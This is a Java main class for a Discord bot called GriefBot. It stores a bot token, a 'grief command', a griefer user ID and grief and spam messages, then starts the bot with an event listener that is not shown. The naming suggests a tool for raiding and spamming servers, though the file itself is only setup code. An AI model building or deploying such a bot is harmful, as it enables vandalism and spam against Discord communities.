package de.corruptedbytes;

import javax.security.auth.login.LoginException;

import de.corruptedbytes.utils.Config;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.sharding.DefaultShardManagerBuilder;
import net.dv8tion.jda.api.sharding.ShardManager;

public class GriefBot {

	private final static GriefBot INSTANCE = new GriefBot();
	private ShardManager botManager;

	private String discordBotToken;
	private String griefCommand;
	private String grieferUserID;
	private String activityDescription;
	private String griefMessage;
	private String spamMessage;

	public static GriefBot getInstance() {
		return INSTANCE;
	}

	public ShardManager getBotManager() {
		return botManager;
	}

	public String getDiscordBotToken() {
		return discordBotToken;
	}

	public void setDiscordBotToken(String discordBotToken) {
		this.discordBotToken = discordBotToken;
	}

	public String getGriefCommand() {
		return griefCommand;
	}

	public void setGriefCommand(String griefCommand) {
		this.griefCommand = griefCommand;
	}

	public String getGrieferUserID() {
		return grieferUserID;
	}

	public void setGrieferUserID(String grieferUserID) {
		this.grieferUserID = grieferUserID;
	}

	public String getActivityDescription() {
		return activityDescription;
	}

	public void setActivityDescription(String activityDescription) {
		this.activityDescription = activityDescription;
	}

	public String getGriefMessage() {
		return griefMessage;
	}

	public void setGriefMessage(String griefMessage) {
		this.griefMessage = griefMessage;
	}
	
	public String getSpamMessage() {
		return spamMessage;
	}
	
	public void setSpamMessage(String spamMessage) {
		this.spamMessage = spamMessage;
	}

	public static void main(String[] args) {
		try {
			Config.initConfig();

			DefaultShardManagerBuilder builder = DefaultShardManagerBuilder
					.createDefault(getInstance().getDiscordBotToken());
			
			builder.addEventListeners(new GriefBotListener());
			builder.setActivity(
					Activity.streaming(getInstance().getActivityDescription(), "https://www.twitch.tv/twitch"));
			builder.setStatus(OnlineStatus.ONLINE);

			try {
				getInstance().botManager = builder.build();
			} catch (LoginException | IllegalArgumentException e) {
				System.err.println("Bot can't authenticate with Discord");
				e.printStackTrace();
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
